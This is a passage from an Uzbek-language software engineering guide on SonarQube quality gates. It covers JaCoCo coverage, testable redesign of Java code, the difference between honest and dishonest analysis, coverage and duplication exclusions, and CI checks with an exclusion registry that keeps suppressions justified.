### 11.11 Qamrash qiyin kodni qayta loyihalash: dizayn signali sifatida qarash

Agar metodga test yozish uchun beshta mock, static mocking va `ReflectionTestUtils` kerak bo'lsa, muammo testda emas. Qamrash qiyinligi deyarli har doim bog'liqlik yoki javobgarlik muammosining o'lchovi.

```java
// Qamrash qiyin: static chaqiruv, vaqt, tasodif va I/O bir joyda
public Invoice issue(Order order) {
    var now = LocalDateTime.now();                 // vaqtni almashtirib bo'lmaydi
    var no = "INV-" + UUID.randomUUID();           // har safar boshqa natija
    var pdf = PdfRenderer.render(order);           // static, mock qilish og'ir
    Files.write(Path.of("/data", no + ".pdf"), pdf); // fayl tizimi
    return new Invoice(no, now, order.total());
}
```

`Clock`, nomer generatori va saqlovchi interfeys sifatida kiritiladi, shundan keyin test oddiy va deterministik bo'ladi.

```java
public Invoice issue(Order order) {
    // uchta bog'liqlik ham konstruktor orqali kiradi
    var no = numbers.next();
    var invoice = new Invoice(no, clock.instant(), order.total());
    storage.put(no, renderer.render(order));
    return invoice;
}

@Test
void hisobFakturaYaratiladi() {
    var fixed = Clock.fixed(Instant.parse("2025-03-01T10:00:00Z"), UTC);
    var service = new InvoiceService(fixed, () -> "INV-1", storage, renderer);

    var invoice = service.issue(TestData.order("150.00"));

    assertThat(invoice.number()).isEqualTo("INV-1");
    verify(storage).put(eq("INV-1"), any());
}
```

Qoida: test og'irlashgan joyda avval dizaynni so'roq qiling. Mock soni uchtadan oshsa, metod juda ko'p ish qilyapti.

### 11.12 Oddiy yondashuv va arxitektor yondashuvi

| Holat | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Private konstruktor | Reflection bilan chaqirib coverage bo'yaladi | Utility klass value object ga aylantiriladi, konstruktor ishlaydigan kodga kiradi |
| `equals` va `hashCode` | Har maydon uchun qo'lda test yoziladi | `record` ishlatiladi yoki EqualsVerifier bilan kontrakt bir testda sinaladi |
| Getter va setter | Har biriga alohida test yoziladi | Lombok `@Generated` filtri yoki `record`, DTO paketi exclusion da |
| `catch` bloki | "Istisnoni sinab bo'lmaydi" deb qoldiriladi | Mock istisno tashlaydi, yon ta'sir ham `verify` bilan tasdiqlanadi |
| Null tekshiruv | Har metod boshida `if` va unga test | Validatsiya turga va chegaraga ko'chiriladi, ichkarida tekshiruv olib tashlanadi |
| `@Bean` metodi | `new` bilan qo'lda yasab test yoziladi | `ApplicationContextRunner` bilan sozlash va bog'lanish sinaladi |
| Mapper | Har maydon uchun assert yoziladi | MapStruct `ReportingPolicy.ERROR`, yo'qotilgan maydon build ni buzadi |
| `main` metodi | Bo'sh `contextLoads` testi qo'shiladi | `main` da mantiq qoldirilmaydi, klass exclusion ga kiradi |
| Yetib bo'lmaydigan `default` | Istisno tashlanadi va test yozilmaydi | `switch` expression, kompilyator to'liqligini kafolatlaydi |
| Qamrash qiyin metod | Static mocking va reflection bilan sindiriladi | Bog'liqlik inject qilinadi, metod sof funksiyaga yaqinlashtiriladi |

### 11.13 Tuzoq va yechim

| Tuzoq | Nima bo'ladi | Yechim |
|---|---|---|
| Keng exclusion patterni (`**/model/**`) | Mantiq bor klasslar ham hisobdan chiqadi, gate yolg'on yashil bo'ladi | Exclusion ni faqat mantiqsiz paketga qo'yish va har sprint qayta ko'rish |
| Reflection bilan private konstruktor testi | Coverage o'sadi, sifat o'smaydi, test hech nimani ushlamaydi | Dizaynni o'zgartirish yoki exclusion, lekin halol yozib qo'yish |
| Lombok bor, `lombok.config` yo'q | Getter lar `@Generated` olmaydi va qamralmagan qoladi | `lombok.addLombokGeneratedAnnotation = true` qo'shish |
| `catch` da faqat log | Sonar istisno yutilganini belgilaydi, test ma'nosiz bo'ladi | Istisnoni kontekst bilan yuqoriga chiqarish yoki qarorga aylantirish |
| `default` da `IllegalStateException` | Qamralmagan tarmoq doimiy qoladi | Enum ustida `switch` expression, `default` olib tashlanadi |
| Konfiguratsiya to'liq exclusion da | `@ConditionalOnProperty` xatosi hech qachon sezilmaydi | Shart bor konfiguratsiyani `ApplicationContextRunner` bilan sinash |
| `toString` ga assert yozish | Format o'zgarsa test buziladi, bug esa o'tib ketadi | Faqat log shartnoma bo'lsa sinash, aks holda generatsiyaga topshirish |
| Faqat umumiy coverage ga qarash | Yangi kodda nol qamrov bo'lsa ham umumiy raqam yashil turadi | Gate ni "new code" coverage va duplication shartlariga bog'lash |

### 11.14 Hisobotni tekshirish

Qaysi klass qancha zarar keltirayotganini bilish uchun JaCoCo hisobotini bevosita ko'rish foydali. Bu Sonar ga yuborishdan oldingi eng tez tekshiruv.

```bash
# hisobotni yasash va qamralmagan klasslarni ko'rish
mvn -q clean verify
# har bir klassning nomi va qamralmagan qator soni
xmllint --xpath "//class/@name" target/site/jacoco/jacoco.xml \
  | tr " " "\n" | sed -n "1,40p"
# batafsil tahlil uchun HTML hisobot
xdg-open target/site/jacoco/index.html
```

Ro'yxatning tepasida DTO, mapper va konfiguratsiya turgan bo'lsa, ishni exclusion va `record` bilan boshlang. Tepada servis va domen klasslari bo'lsa, exclusion emas, test yozish kerak. Gate shartlarini sozlash shu hujjatning quality gate mavzusida, test tuzilishi esa testlash qo'llanmasidagi unit test mavzusida.

### 11.15 Amalda qo'llash

- [ ] JaCoCo XML hisobotidan eng ko'p qamralmagan qator bergan 15 klassni chiqarib, ularni "mantiq bor" va "mantiq yo'q" ikki guruhga ajrating.
- [ ] `lombok.config` ga `lombok.addLombokGeneratedAnnotation = true` qo'shib, hisobotdagi getter va setter qatorlari yo'qolganini tasdiqlang.
- [ ] Mantiqsiz DTO larni `record` ga o'tkazing va `equals`, `hashCode`, `toString` ni qo'lda yozilgan joydan olib tashlang.
- [ ] `sonar.coverage.exclusions` ni qayta yozib, faqat `**/dto/**`, `**/config/**` va `**/*Application.java` kabi aniq mantiqsiz yo'llarni qoldiring.
- [ ] Har bir `catch` blokini ko'rib chiqing: faqat log qiladiganlarini istisno chiqarishga aylantiring, qaror qabul qiladiganlariga mock orqali test yozing.
- [ ] Enum ustidagi barcha `switch` ni expression shakliga o'tkazing va qamralmaydigan `default` tarmoqlarini o'chirib tashlang.
- [ ] Qo'lda yozilgan mapperlarni MapStruct ga `unmappedTargetPolicy = ReportingPolicy.ERROR` bilan ko'chiring yoki `hasNoNullFieldsOrProperties` testi qo'shing.
- [ ] Testida uchtadan ko'p mock talab qiladigan metodlarni ro'yxatga oling va ularni `Clock` hamda interfeys injection bilan qayta loyihalashni rejaga kiriting.

## 12. Exclusion: nimani chiqarish halol, nimani chiqarish aldov (Exclusions, Honest and Dishonest)

Exclusion Sonarda eng kuchli va ayni paytda eng xavfli sozlama. Bir qator konfiguratsiya bilan siz minglab satrni tahlildan chiqarib, quality gate ni yashil qilib qo'yishingiz mumkin. Farq shundaki, ba'zi exclusion lar o'lchovni aniqroq qiladi, boshqalari esa o'lchovni soxtalashtiradi. Bu bob shu ikki holatni ajratishga, va qaysi biri ekanini kod review da isbotlashga qaratilgan.

### 12.1 Exclusion turlari: tahlildan, qamrovdan, takrorlanishdan, muayyan qoidadan

Sonarda "chiqarish" bitta tugma emas, balki to'rtta mustaqil qatlam. Birinchisi tahlildan chiqarish: fayl umuman skanerlanmaydi, uning issue lari ham, satrlari ham loyiha metrikasida yo'q. Ikkinchisi coverage dan chiqarish: fayl tahlil qilinadi va code smell lari ko'rinadi, lekin "qoplanishi kerak bo'lgan satrlar" hisobiga kirmaydi. Uchinchisi duplication dan chiqarish: fayl tahlilda ham, coverage da ham qoladi, faqat takrorlanish detektori uni ko'rmaydi. To'rtinchisi eng nozik qatlam: muayyan qoidani muayyan fayl naqshi uchun o'chirish, qolgan hamma qoida esa ishlashda davom etadi.

Bu to'rtta qatlamni bilish amaliy ahamiyatga ega. Ko'pchilik jamoa aslida bitta qoidadan bezor bo'lib, butun faylni tahlildan chiqarib tashlaydi. Natijada o'sha faylda keyin paydo bo'ladigan haqiqiy nuqsonlar ham abadiy ko'rinmas bo'lib qoladi. To'g'ri reaksiya eng tor qatlamni tanlash: avval bitta qoida, keyin coverage, keyin duplication, va faqat oxirgi chora sifatida butun fayl.

### 12.2 `sonar.exclusions`, `sonar.coverage.exclusions`, `sonar.cpd.exclusions` farqi

Uchala kalit fayl naqshini qabul qiladi, lekin ta'siri butunlay boshqacha. `sonar.exclusions` faylni manba kodi to'plamidan olib tashlaydi, shuning uchun Lines of Code kamayadi va o'sha fayl hech qanday metrikada qatnashmaydi. `sonar.coverage.exclusions` faqat coverage o'lchoviga ta'sir qiladi: fayldagi satrlar "uncovered" deb hisoblanmaydi, chunki ular umuman "to cover" ro'yxatiga tushmaydi. `sonar.cpd.exclusions` esa copy-paste detektorini o'chiradi va bu generatsiya qilingan yoki qolip asosidagi kodda o'rinli.

```properties
# sonar-project.properties: har bir qatlam o'z vazifasi uchun
sonar.projectKey=payment-service
sonar.java.binaries=target/classes

# Tahlildan butunlay chiqarish: faqat generatsiya qilingan kod
sonar.exclusions=\
  target/generated-sources/**/*, \
  **/generated/**/*Grpc.java, \
  **/*MapperImpl.java

# Tahlilda qoladi, lekin coverage talab qilinmaydi
sonar.coverage.exclusions=\
  **/config/**/*Config.java, \
  **/PaymentServiceApplication.java, \
  **/dto/**/*Request.java

# Takrorlanish detektoridan chiqarish: qolip asosidagi fayllar
sonar.cpd.exclusions=\
  **/dto/**/*.java, \
  **/*Entity.java

sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
```

Muhim halollik nuqtasi: `sonar.exclusions` coverage foizining maxrajini ham kichraytiradi. Ya'ni siz testlanmagan katta faylni tahlildan chiqarsangiz, coverage raqami o'z-o'zidan ko'tariladi. Bu raqam yaxshilanishi emas, o'lchov maydonining qisqarishi. Shu sababli coverage ni ko'tarish uchun `sonar.exclusions` ga tegish eng ko'p uchraydigan aldov usuli.

Muayyan qoidani tor doirada o'chirish uchun multicriteria mexanizmi ishlatiladi. Bu eng aniq vosita, chunki u "qaysi qoida" va "qaysi fayl" degan ikki savolga aniq javob beradi.

```xml
<!-- pom.xml: bitta qoidani bitta fayl naqshi uchun o'chirish -->
<properties>
  <!-- Har bir ignore uchun alohida kalit, vergul bilan ro'yxat -->
  <sonar.issue.ignore.multicriteria>e1,e2</sonar.issue.ignore.multicriteria>

  <!-- e1: migratsiya testlarida "magic number" qoidasi mantiqsiz -->
  <sonar.issue.ignore.multicriteria.e1.ruleKey>java:S109</sonar.issue.ignore.multicriteria.e1.ruleKey>
  <sonar.issue.ignore.multicriteria.e1.resourceKey>
    **/migration/*MigrationTest.java
  </sonar.issue.ignore.multicriteria.e1.resourceKey>

  <!-- e2: qator takrorlanishi qolip fayllarida kutilgan hol -->
  <sonar.issue.ignore.multicriteria.e2.ruleKey>java:S1192</sonar.issue.ignore.multicriteria.e2.ruleKey>
  <sonar.issue.ignore.multicriteria.e2.resourceKey>
    **/support/TestFixtures.java
  </sonar.issue.ignore.multicriteria.e2.resourceKey>
</properties>
```

### 12.3 Generatsiya qilingan kodni chiqarish: nega bu halol qaror

Generatsiya qilingan kod uchun exclusion halol, chunki uning muallifi odam emas. MapStruct ning `MapperImpl` fayli, gRPC yoki Protobuf stublari, OpenAPI dan chiqqan klient klasslari, QueryDSL ning `Q` klasslari, JOOQ sxemasi: bularning hech birini developer qo'li bilan tuzatmaydi. Sonar bu fayllarda "uzun metod" yoki "takrorlangan blok" deb shikoyat qilsa, bu shikoyatga javob yo'q, chunki tuzatish keyingi build da yo'q bo'ladi.

Ikkinchi dalil texnik: generatsiya qilingan kod `target/` yoki `build/` ichida yotadi va versiya nazoratida bo'lmaydi. Uni tahlilga qo'shish quality gate ni generator versiyasiga bog'lab qo'yadi. Generator yangilansa, hech kim kod yozmagan holda yuzlab yangi issue paydo bo'ladi. Bu "new code" o'lchovini ma'nosiz qiladi, chunki new code endi odamning o'zgarishini emas, bog'liqlik yangilanishini aks ettiradi.

Uchinchi dalil mas'uliyat haqida. Generatorning o'zi kutubxona bo'lib, uning sifatini sizning jamoangiz emas, uning muallifi nazorat qiladi. Sizning mas'uliyatingiz generatorga beradigan kirish: mapper interfeysi, `.proto` fayli, OpenAPI spetsifikatsiyasi. Shu kirish fayllari esa tahlilda qolishi kerak, chunki ularni odam yozadi.

### 12.4 DTO, entity va konfiguratsiya klasslarini chiqarish: qachon o'rinli

Bu yerda javob "shartli". DTO va entity ni coverage dan chiqarish o'rinli, qachonki ularda mantiq bo'lmasa. Faqat maydon, getter, setter, `equals` va `hashCode` bo'lgan klass uchun test yozish hech narsani isbotlamaydi. Lekin entity ichida `addItem` metodi invariant tekshirsa, yoki DTO ichida `toDomain` konvertatsiyasi bo'lsa, u endi mantiq va coverage dan chiqarilmasligi kerak.

```java
// YOMON: entity ichida mantiq bor, lekin coverage dan chiqarilgan
@Entity
public class Order {
    @Id private Long id;
    private BigDecimal total;
    private OrderStatus status;

    // Bu invariant: bekor qilingan buyurtmaga qator qo'shilmaydi.
    // Shu shart testsiz qolsa, regressiya jim o'tadi.
    public void addItem(OrderItem item) {
        if (status == OrderStatus.CANCELLED) {
            throw new IllegalStateException("Bekor qilingan buyurtma o'zgarmaydi");
        }
        total = total.add(item.getLineTotal());
    }
}
```

Amaliy qoida oddiy: coverage exclusion ni paket nomiga emas, mantiq mavjudligiga bog'lang. Agar `**/dto/**` naqshini yozsangiz, keyin kimdir o'sha paketga validatsiya yoki hisob-kitob qo'shsa, u avtomatik ravishda nazoratdan chiqadi. Xavfsizroq yo'l: DTO larni `record` qilish va mantiqni servis qatlamiga chiqarish. Shunda exclusion naqshi tabiiy ravishda faqat mantiqsiz turlarni qamrab oladi.

Konfiguratsiya klasslari uchun vaziyat biroz boshqacha. `@Configuration` klassidagi `@Bean` metodini unit test qilish Spring kontekstini qayta yozishga teng va bu ortiqcha ish. Lekin kontekst haqiqatan ko'tarilishini bitta integratsion test tekshirishi shart. Shu testning qanday yozilishi testlash qo'llanmasidagi Spring Boot test slice lari mavzusida bor.

### 12.5 Migratsiya skriptlari va qolip (template) fayllari

Flyway yoki Liquibase migratsiyalari Java tahlilining predmeti emas, shuning uchun ular `sonar.sources` ga tushsa ham Java qoidalari ularga tegmaydi. Muammo boshqa joyda: migratsiya skripti o'zgarmas artefakt. U bir marta ishlab, keyin faqat tarix bo'lib qoladi. Shu sababli migratsiya papkasini duplication dan chiqarish mantiqiy, chunki ketma-ket skriptlar bir-biriga tabiiy o'xshaydi.

```sql
-- V12__order_payment_status.sql: ishlab ketgan migratsiya, endi o'zgarmaydi
-- Duplication dan chiqarilgan, chunki V11 bilan struktura o'xshash.
-- Lekin mazmuni integratsion test bilan tekshirilgan.
ALTER TABLE orders
    ADD COLUMN payment_status VARCHAR(32) NOT NULL DEFAULT 'PENDING';

-- Mavjud qatorlarni to'lov jurnalidan to'ldirish
UPDATE orders o
SET payment_status = 'PAID'
WHERE EXISTS (
    SELECT 1 FROM payments p
    WHERE p.order_id = o.id AND p.state = 'SETTLED'
);

-- Indeks: hisobot so'rovi status bo'yicha filtrlaydi
CREATE INDEX idx_orders_payment_status ON orders (payment_status);
```

Qolip fayllari, ya'ni Thymeleaf shablonlari, HTML parchalari, `freemarker` fayllari, o'z qoidalar to'plamiga ega. Agar jamoada frontend uchun alohida linter bor bo'lsa, bu fayllarni Sonar tahlilidan chiqarish takrorlanishni kamaytiradi. Lekin bu qarorni yozib qo'yish kerak, aks holda keyin "nega template da XSS tekshirilmadi" degan savol javobsiz qoladi.

Migratsiya skriptining mazmuni esa albatta testlanishi kerak. Yuqoridagi `UPDATE` noto'g'ri yozilsa, baza buzuladi va Sonar bu haqda hech narsa aytmaydi. Haqiqiy baza ustida migratsiyani ishlatib tekshirish yo'li testlash qo'llanmasidagi Testcontainers mavzusida tasvirlangan.

### 12.6 `@Generated` annotatsiyasi va JaCoCo ning unga munosabati

JaCoCo 0.8.2 dan boshlab filtr mexanizmiga ega. U nomi `Generated` so'zini o'z ichiga olgan annotatsiya bilan belgilangan klass va metodlarni coverage hisobidan chiqaradi. Bu juda qulay, chunki konfiguratsiya fayliga naqsh yozish kerak emas, belgi kodning o'zida turadi.

Lekin bitta shart bor va u ko'pchilikni chalg'itadi: annotatsiyaning retention i `CLASS` yoki `RUNTIME` bo'lishi kerak. `javax.annotation.processing.Generated` retention i `SOURCE`, shuning uchun u bytecode ga tushmaydi va JaCoCo uni mutlaqo ko'rmaydi. Lombok ning `lombok.Generated` annotatsiyasi esa `CLASS` retention bilan keladi va ishlaydi.

```java
// Loyiha ildizidagi lombok.config fayliga:
//   lombok.addLombokGeneratedAnnotation = true
// Shundan keyin @Data dan chiqqan getter coverage da hisoblanmaydi.

// O'z generatoringiz bo'lsa, retention ni to'g'ri tanlang
@Retention(RetentionPolicy.CLASS)   // SOURCE bo'lsa JaCoCo ko'rmaydi
@Target({ElementType.TYPE, ElementType.METHOD})
public @interface Generated { }

// Generator chiqargan klass shu belgini oladi
@Generated
public final class OrderMapperImpl implements OrderMapper {
    @Override
    public OrderDto toDto(Order order) {
        return new OrderDto(order.getId(), order.getTotal());
    }
}
```

SonarQube ning o'zi bu annotatsiyani exclusion sifatida qabul qilmaydi. Ya'ni coverage JaCoCo tomonidan filtrlanadi, lekin code smell lar baribir ko'rinishi mumkin. Shuning uchun generatsiya qilingan kod uchun ikki qatlam kerak: JaCoCo filtri coverage uchun va `sonar.exclusions` yoki `sonar.cpd.exclusions` issue lar uchun. Lombok holatida qo'shimcha nuqta bor: Lombok yaratgan metodlar manba kodida yo'q, shuning uchun Sonar ularda issue ochmaydi.

### 12.7 Kod ichida bostirish: `@SuppressWarnings` va Sonar ning maxsus izohi

Kod ichida bostirishning ikki yo'li bor. Birinchisi `@SuppressWarnings("java:SXXXX")`: aniq qoida kalitini ko'rsatadi, faqat shu element uchun ishlaydi va IDE da ham ko'rinadi. Ikkinchisi satr oxiriga qo'yiladigan `// NOSONAR` izohi: u o'sha satrdagi barcha issue larni o'chiradi va aynan shu kengligi uchun xavfli.

```java
public class PaymentGatewayClient {

    // To'g'ri usul: aniq qoida kaliti va sababi yonida
    // Reflection bu yerda shart, chunki gateway SDK si public API bermaydi.
    // Jira: PAY-1841. Qayta ko'rish: SDK 4.x chiqqanda olib tashlanadi.
    @SuppressWarnings("java:S3011")
    private void forceAccessible(Field field) {
        field.setAccessible(true);
    }

    // YOMON usul: NOSONAR barcha qoidani o'chiradi, sabab yo'q
    public BigDecimal parse(String raw) {
        return new BigDecimal(raw); // NOSONAR
    }

    // YAXSHI: muammoni bostirish emas, hal qilish
    public BigDecimal parseSafely(String raw) {
        try {
            return new BigDecimal(raw);
        } catch (NumberFormatException e) {
            // Noto'g'ri format biznes xatosi, texnik xato emas
            throw new InvalidAmountException("Summa formati noto'g'ri: " + raw, e);
        }
    }
}
```

`@SuppressWarnings` ning ustunligi shundaki, u versiya nazoratida ko'rinadi va kod review da muhokama qilinadi. Konfiguratsiya faylidagi exclusion esa bir marta yoziladi, keyin hamma uni unutadi. Shu sababli tor doirali bostirish uchun annotatsiya deyarli har doim konfiguratsiyadan yaxshiroq.

NOSONAR ning yana bir xususiyati bor: Sonar uning ishlatilishini kuzatuvchi qoidaga ega va bu qoidani profilda yoqib qo'yish mumkin. Shunda har bir NOSONAR o'zi issue sifatida ko'rinadi va jim qolmaydi. Agar jamoa NOSONAR ni umuman taqiqlashni xohlasa, bu qoidani blocker darajasiga ko'tarish eng sodda yechim.

### 12.8 Bostirishni majburan asoslash: izoh talab qilish qoidasi

Asoslanmagan bostirish texnik qarzni yashiradi, shuning uchun jamoa darajasida bitta mexanik qoida kiritish kerak: har bir bostirish yonida sabab, egasi va muddati bo'lishi shart. Buni odamning yaxshi niyatiga qoldirmang, CI da tekshiring. Grep darajasidagi tekshiruv ham yetarli natija beradi.

```bash
#!/usr/bin/env bash
# scripts/check-suppressions.sh: asoslanmagan bostirishni topadi
set -euo pipefail

# Har bir NOSONAR satridan oldin izoh borligini talab qilamiz
bad=$(grep -rn --include="*.java" "NOSONAR" src/main \
  | grep -v "NOSONAR \[" || true)

if [ -n "$bad" ]; then
  echo "Asoslanmagan NOSONAR topildi. Format: // NOSONAR [PAY-123: sabab]"
  echo "$bad"
  exit 1
fi

# Bostirish sonini kuzatish: o'sib borsa, review da savol bo'ladi
grep -rc --include="*.java" "@SuppressWarnings(\"java:" src/main \
  | awk -F: '{s+=$2} END {print "Bostirish soni:", s+0}' 
```

Bu skriptni pipeline ning lint bosqichiga qo'ying. Natijada bostirish qo'shish mumkin, lekin arzon emas: muallif sabab yozishi va tiket ochishi kerak. Amalda shu kichik to'siq bostirish sonini sezilarli kamaytiradi, chunki ko'p holatda muammoni tuzatish sabab yozishdan oson bo'lib chiqadi.

### 12.9 Aldov belgilari: butun paketni chiqarish, murakkab klassni chiqarish

Aldovni tanib olish uchun bitta savol yetarli: "Bu exclusion olib tashlansa, qaysi issue qaytib keladi, va u haqiqiy muammomi?" Agar javob "bizning asosiy to'lov hisoblash klassidagi cognitive complexity" bo'lsa, bu exclusion emas, yashirish. Agar javob "generatorning uzun switch i" bo'lsa, bu o'rinli.

| Halol exclusion | Aldov exclusion |
|---|---|
| `target/generated-sources/**` tahlildan chiqarilgan | `**/service/**` tahlildan chiqarilgan |
| `**/*MapperImpl.java` MapStruct chiqargani uchun | `PaymentCalculator.java` testi qiyin bo'lgani uchun |
| `**/config/*Config.java` coverage dan chiqarilgan | `**/*Service.java` coverage dan chiqarilgan |
| `java:S1192` faqat test fixture faylida o'chirilgan | `java:S3776` butun loyihada o'chirilgan |
| Migratsiya papkasi duplication dan chiqarilgan | Domen paketi duplication dan chiqarilgan |
| `@SuppressWarnings` bitta metodda, Jira kaliti bilan | Klass ustida `@SuppressWarnings("all")` |
| Exclusion sababi va egasi hujjatda bor | Exclusion kim va qachon qo'shganini hech kim bilmaydi |
| Gate yashil bo'ldi, chunki test yozildi | Gate yashil bo'ldi, chunki maxraj kichraydi |

Uchta eng xavfli naqsh borki, ularni review da avtomatik rad etish kerak. Birinchisi `**/*Service.java` yoki `**/*Impl.java` kabi butun qatlamni qamrab oluvchi naqsh. Ikkinchisi global qoida o'chirish, ya'ni `resourceKey` o'rniga `**/*` yozish. Uchinchisi gate tushgandan keyin bir soat ichida qo'shilgan har qanday exclusion, chunki uning motivi texnik emas, muddatga bog'liq.

| Tuzoq | Nima bo'ladi | Yechim |
|---|---|---|
| Coverage ni ko'tarish uchun `sonar.exclusions` ishlatish | Maxraj kichrayadi, sifat o'zgarmaydi | `coverage.exclusions` dan foydalanish yoki test yozish |
| `**/dto/**` coverage dan chiqarish | Keyin DTO ga qo'shilgan mantiq nazoratsiz qoladi | Mantiqni servisga chiqarish, DTO ni `record` qilish |
| `javax.annotation.processing.Generated` ga ishonish | Retention `SOURCE`, JaCoCo filtrlamaydi | `CLASS` retention li annotatsiya yoki Lombok konfiguratsiyasi |
| Satr oxirida sabab yozilmagan `// NOSONAR` | Qaysi muammo yashirilgani bilinmaydi | Formatni CI da majburlash, NOSONAR qoidasini yoqish |
| Exclusion ni faqat lokal `sonar-project.properties` da saqlash | Server tomonidagi sozlama bilan ziddiyat | Bitta manba: repozitoriydagi fayl, serverda bo'sh |
| Gradle va Maven da turlicha exclusion | Lokal va CI natijasi mos kelmaydi | Sozlamani bitta joyda, build fayliga ko'chirish |
| Exclusion naqshi juda keng, masalan `**/*Util*` | Tasodifiy fayllar ham chiqib ketadi | Naqshni fayl nomiga aniqlashtirish |
| Exclusion hech qachon olib tashlanmaydi | Yillar o'tib kod yarmi nazoratdan tashqarida | Har bir yozuvga amal qilish muddati qo'yish |

### 12.10 Exclusion ro'yxatini ko'rib chiqish tartibi va uni kim tasdiqlaydi

Exclusion ni oddiy kod o'zgarishi deb qarash xato, chunki u o'lchov tizimini o'zgartiradi. Shuning uchun uni qo'shish alohida tartibga ega bo'lishi kerak. Minimal tartib shunday: exclusion faqat alohida pull request da keladi, biznes kodi bilan birga emas. Bu review ni osonlashtiradi, chunki reviewer diff da faqat sozlamani ko'radi.

Tasdiqlovchi masalasi aniq bo'lishi kerak. Coverage va duplication exclusion ini texnik yetakchi tasdiqlashi yetarli. Tahlildan butunlay chiqarish va global qoida o'chirish esa arxitektor tasdig'ini talab qiladi, chunki bu quality gate ning ma'nosini o'zgartiradi. Security kategoriyasidagi qoidani o'chirish alohida holat va unga security mas'uli ham qo'shilishi kerak.

```yaml
# .github/workflows/sonar.yml dan parcha: exclusion o'zgarishini ajratib ushlash
name: sonar
on: [pull_request]
jobs:
  guard-exclusions:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      # Exclusion sozlamasi o'zgargan bo'lsa, alohida egani talab qilamiz
      - name: Exclusion diff tekshiruvi
        run: |
          changed=$(git diff --name-only origin/${{ github.base_ref }}...HEAD)
          if echo "$changed" | grep -qE 'sonar-project.properties|sonar-exclusions.yml'; then
            echo "Exclusion o'zgargan: arxitektor review i shart"
          fi
      - name: Tahlil
        run: ./mvnw -B verify sonar:sonar
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

Davriy ko'rib chiqish ham kerak. Chorakda bir marta ro'yxatni ochib, har bir yozuv uchun uchta savolga javob bering: sababi hali ham kuchdami, egasi hali jamoadami, naqsh hali ham mavjud fayllarga mos keladimi. Mos kelmaydigan naqshlar eng xavfli, chunki ular jim turib keyin kutilmagan fayllarni qamrab oladi.

### 12.11 Exclusion siyosatini hujjatlashtirish namunasi

Konfiguratsiya fayli "nima" degan savolga javob beradi, lekin "nega" degan savolga javob bermaydi. Shu sababli har bir exclusion uchun strukturalangan yozuv saqlash kerak. Eng amaliy shakl: repozitoriyda yotgan YAML fayl, unda sabab, egasi, qatlam va amal qilish muddati bor.

```yaml
# docs/sonar-exclusions.yml: exclusion registri, review da o'qiladigan manba
policy:
  review_cycle: quarterly          # Chorakda bir marta ko'rib chiqiladi
  approver_full_exclusion: architect
  approver_coverage: tech_lead

entries:
  - pattern: "target/generated-sources/**/*"
    layer: analysis                # analysis | coverage | cpd | rule
    reason: "MapStruct va OpenAPI generatori chiqargan kod, odam yozmaydi"
    owner: "payments-team"
    added: 2025-02-11
    expires: never                 # Generator bor ekan, doimiy
  - pattern: "**/config/**/*Config.java"
    layer: coverage
    reason: "@Bean metodlari kontekst testida bilvosita tekshiriladi"
    owner: "a.karimov"
    expires: never
  - pattern: "**/report/LegacyReportBuilder.java"
    layer: coverage
    reason: "Eski hisobot moduli, 2026 Q2 da olib tashlanadi"
    owner: "d.yusupova"
    added: 2025-06-20
    expires: 2026-06-30            # Muddatdan keyin CI ogohlantiradi
    ticket: "REP-908"
```

`expires: never` qiymati faqat tabiatan o'zgarmas holatlar uchun, masalan generatsiya qilingan kod. Vaqtinchalik yon berishlar uchun aniq sana bo'lishi shart va CI shu sanani tekshirishi kerak. Muddati o'tgan yozuv build ni yiqitmasligi mumkin, lekin ogohlantirish berishi va chorakli review ro'yxatiga tushishi kerak.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Exclusion maqsadi | Gate ni yashil qilish | O'lchovni haqiqatga yaqinlashtirish |
| Qatlam tanlash | Darhol `sonar.exclusions` | Eng tor qatlamdan boshlash |
| Naqsh kengligi | Paket darajasida `**/service/**` | Fayl nomi darajasida aniq naqsh |
| Sabab | Diff da izohsiz qator | Registrda sabab, ega va muddat |
| Tasdiqlash | Muallif o'zi qo'shadi | Qatlamga qarab yetakchi yoki arxitektor |
| Bostirish shakli | Satr oxirida `// NOSONAR` | Aniq kalitli `@SuppressWarnings` va tiket |
| Generatsiya qilingan kod | Hamma narsani exclusion ga tiqish | JaCoCo filtri va kirish faylini tahlilda qoldirish |
| Davriylik | Bir marta yozilib unutiladi | Chorakli ko'rib chiqish va muddat nazorati |
| Coverage pasayganda | Exclusion naqshini kengaytirish | Yetishmayotgan test holatini yozish |
| CI nazorati | Hech qanday tekshiruv yo'q | Exclusion diff i va bostirish formati tekshiriladi |

### 12.12 Amalda qo'llash

- [ ] Loyihadagi barcha exclusion sozlamalarini bitta `sonar-project.properties` ga yig'ing va serverdagi dublikat sozlamalarni o'chiring.
- [ ] Har bir mavjud exclusion yonida qaysi qatlamga tegishli ekanini belgilang: tahlil, coverage, duplication yoki muayyan qoida.
- [ ] `sonar.exclusions` ichidagi har bir naqshni tekshirib, generatsiya qilinmagan kodni qamrab olganlarini `coverage.exclusions` ga ko'chiring yoki butunlay olib tashlang.
- [ ] `lombok.config` ga `lombok.addLombokGeneratedAnnotation = true` qo'shib, JaCoCo hisobotida coverage farqini o'lchab ko'ring.
- [ ] `docs/sonar-exclusions.yml` registrini yarating: har bir yozuvda sabab, ega, sana va muddat bo'lsin.
- [ ] CI ga bostirish formatini tekshiradigan skript qo'shing va asoslanmagan `NOSONAR` uchun build ni yiqitadigan qiling.
- [ ] CODEOWNERS ga exclusion fayllarini kiritib, arxitektor review ini majburiy qilib qo'ying.
- [ ] Chorakli ko'rib chiqish uchun kalendarga takrorlanuvchi uchrashuv qo'yib, birinchi majlisda muddati o'tgan yozuvlar ro'yxatini chiqaring.


# IV. Sonar o'tadigan kod

## 13. Sonar o'tadigan kod yozish qoidalari (Writing Code That Passes)

Sonar qoidalarining katta qismi kodning mantiqini emas, shaklini o'lchaydi. Shuning uchun "Sonar o'tadigan kod" degani sirli uslub emas, balki bir nechta o'lchanadigan xususiyatni qondiradigan kod: metod qisqa, shartlar yassi, resurs yopilgan, istisno yo'qolmagan, taqqoslash to'g'ri tipda qilingan. Quyida har bir mavzu uchun avval analizator nimadan shikoyat qiladi, keyin o'sha shikoyatni yo'q qiladigan variant keltirilgan. Misollar to'lov, buyurtma va ombor qoldig'i domenidan olingan, chunki real shikoyatlar aynan shunday servislarda to'planadi.

